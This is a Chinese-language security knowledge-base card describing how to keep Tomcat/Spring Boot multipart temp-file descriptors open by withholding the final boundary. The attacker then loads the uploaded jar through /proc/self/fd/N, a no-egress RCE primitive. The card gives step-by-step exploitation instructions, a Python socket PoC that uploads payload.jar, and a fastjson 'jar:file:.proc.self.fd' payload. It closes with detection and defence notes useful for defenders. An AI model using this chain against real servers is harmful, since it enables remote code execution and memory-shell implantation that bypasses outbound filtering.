---
id: web-java-component-tomcat-multipart-tempfile-fd
title: Tomcat multipart 未完成请求保持临时文件 fd 打开
type: scenario
domain: web
path: web/java/component/tomcat
technique: tomcat-multipart-tempfile-fd
affected_versions: Spring Boot 默认 multipart 配置（file-size-threshold=0，max-file-size=1MB）；Tomcat 临时文件机制
tags:
- tomcat
- spring-boot
- multipart
- tempfile
- proc-fd
- file-descriptor
- no-egress
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V2
  verified_at: '2026-11-04T21:38:36+08:00'
  notes: 已对照原文与截图核对：Spring Boot file-size-threshold=0 落盘、未发送结束 boundary 保持连接与 fd、/proc/self/fd/N 指向临时文件、需配合本地读取 sink；作为可独立复用原语建卡合理。原文未给具体 Tomcat/Spring Boot 版本号，仅有默认配置描述，affected_versions 保持配置描述不猜测，恰当。PoC 未独立执行。
url: /docs/web/java/component/tomcat/web-java-component-tomcat-multipart-tempfile-fd/
draft: false
kb_aliases:
- Tomcat 临时文件 fd
- multipart 不结束 boundary
- /proc/self/fd 上传内容
- Spring Boot multipart 临时文件
---

## 一句话结论

向 Tomcat/Spring Boot 的 multipart 接口发送一个“数据已写完但不发送结束 boundary”的请求并保持连接，Tomcat 会把上传内容落到临时文件且不关闭其文件描述符；此时 `/proc/self/fd/N` 就指向攻击者可控的完整内容，任何能读取本地文件/打开 jar 的漏洞都可以把“远程拉取”降级为“目标自读”，绕过不出网限制。

## 原理

- Spring Boot 默认内嵌 Tomcat 处理 multipart：`spring.servlet.multipart.file-size-threshold` 默认 0，意味着每个 file part 都会写入磁盘临时文件；临时目录由 `javax.servlet.context.tempdir` 指定（形如 `work/Tomcat/xxx/ROOT/`），文件名形如 `upload_xxxxxxxx.tmp`。
- Tomcat 在接收/写入该 part 期间持有临时文件的文件描述符。只要请求没有结束（缺少最后的 `--boundary--`），容器就不会完成 part 解析、不会清理临时文件，fd 保持打开。
- Linux 下 `/proc/self/fd/N` 是指向进程第 N 号 fd 的符号链接；打开 `/proc/self/fd/N` 等价于打开那个临时文件。于是攻击者上传的内容（例如 jar）在目标进程看来是一个本地文件。
- 该原语把“目标主动访问攻击者服务器”转换为“目标读取自身已缓存的 fd”，因此不依赖出网。它本身只提供“攻击者可控的本地文件”，需要配合能按路径读取/加载该文件的 sink（如 fastjson 的 `jar:file:`、任意文件读取、类加载器）才能形成 RCE/文件读取。
- 限制：fd 编号不可预测，需要枚举；临时文件内容大小受 `max-file-size`（默认 1MB）限制；临时文件可能在请求超时/连接关闭后被清理，因此要在同一连接保持期间完成后续利用；Linux 才有 `/proc/self/fd`。

## 触发条件

- 目标为 Linux，且应用运行在 Tomcat/Spring Boot 内嵌 Tomcat 中。
- 存在可接收 multipart 的上传接口，且上传内容会落盘到临时文件（`file-size-threshold` 为 0 或上传大小超过阈值）。
- 攻击者能保持一个未完成的 HTTP/1.1 请求（keep-alive、不发送结束 boundary），并在其生命周期内发起第二个利用请求。
- 上传内容大小不超过 `max-file-size`（默认 1MB），否则请求被拒绝/截断。
- 存在能读取本地路径或打开 jar 的 sink（fastjson `jar:`、文件读取、类加载等）。

## 利用步骤

1. 确认目标上传接口接受 multipart，并观察临时文件行为（如响应时间、错误信息、上传大小限制）。
2. 构造包含目标内容（如 jar + padding）的 multipart 请求，计算正确的 `Content-Length`，但发送时扣留结尾的 `--boundary--`。
3. 使用 `Connection: keep-alive` 保持连接，不关闭 socket；等待容器把内容写入临时文件并持有 fd。
4. 在另一个连接上并发枚举 `/proc/self/fd/N`，用本地文件读取/jar 加载 sink 读取该 fd。
5. 命中后执行后续载荷（如 jar 中的静态块、内存马），并在连接关闭前完成。
6. 若 fd 编号范围未知，分批枚举；每次重新上传以刷新 fd。

## PoC

```python
# 阶段 A：上传内容并扣留结束 boundary，保持 fd 打开
import socket
content = open("payload.jar", "rb").read()
bnd = "----XuanBoundary"
head = (f"--{bnd}\r\n"
        'Content-Disposition: form-data; name="file"; filename="x.jar"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n").encode()
tail = f"\r\n--{bnd}--\r\n".encode()
pad = b"\x00" * 60000
clen = len(head) + len(content) + len(pad) + len(tail)
s = socket.create_connection(("TARGET", 8081), timeout=30)
req = (f"POST /upload HTTP/1.1\r\nHost: TARGET:8081\r\n"
       f"Content-Type: multipart/form-data; boundary={bnd}\r\n"
       f"Content-Length: {clen}\r\nConnection: keep-alive\r\n\r\n").encode()
s.sendall(req + head + content + pad + tail[:-4])  # 扣留结尾 "--"
# 保持 s 不关闭，随后在另一个连接枚举 /proc/self/fd/N
```

```text
# 阶段 B：用任意本地文件读取 sink 访问 fd（以 fastjson 为例）
{"@type":"jar:file:.proc.self.fd.1!.fd1.Exception"}
```

说明：PoC 为结构复现，需替换上传路径、目标地址与后续 sink；未在目标环境执行。

## 变体与关联

- 变体：`file-size-threshold` 大于 0 时，需让单个 part 超过阈值才会落盘；小于阈值时内容可能只在内存中。
- 变体：其他容器/框架的 multipart 临时文件实现也可能保留 fd，但路径、清理时机和 fd 编号不同，需实测。
- 变体：可用分块传输/慢速上传延长 fd 生命周期；也可用多个并发连接增加可用 fd 范围。
- 关联：[[web-java-deser-fastjson-fd-jar-no-egress-rce]]（本原语配合 fastjson `jar:file:` 的完整不出网 RCE）；[[web-java-deser-fastjson-resource-probing-rce]]（fastjson 本地/远程类加载）。
- 关联：[[web-generic-file-inclusion-windows-sam-ntlm-crack]]（同为本地文件读取原语的利用，但目标平台/路径不同）。

## 检测与防御

- 检测：长时间未完成的 multipart 请求；同一来源同时存在未完成上传与大量本地文件/`/proc/self/fd` 访问。
- 检测：Tomcat 工作目录 `work/Tomcat/*/ROOT/upload_*.tmp` 异常增多、长期不清理或体积异常。
- 检测：应用进程访问 `/proc/self/fd/*`（RASP/EDR/auditd 可监控）；JSON/文件读取请求中出现 `.proc.self.fd.` 路径。
- 防御：限制 `max-file-size`/`max-request-size`，设置合理的 multipart 超时与临时文件清理策略；不需要上传的业务关闭 multipart。
- 防御：上传接口与 JSON 解析/文件读取接口分离到不同进程或容器；对本地文件读取 sink 做路径白名单，禁止 `/proc/self/fd`。
- 防御：修补上层 sink（如 fastjson autoType），出网过滤不能阻断该原语。
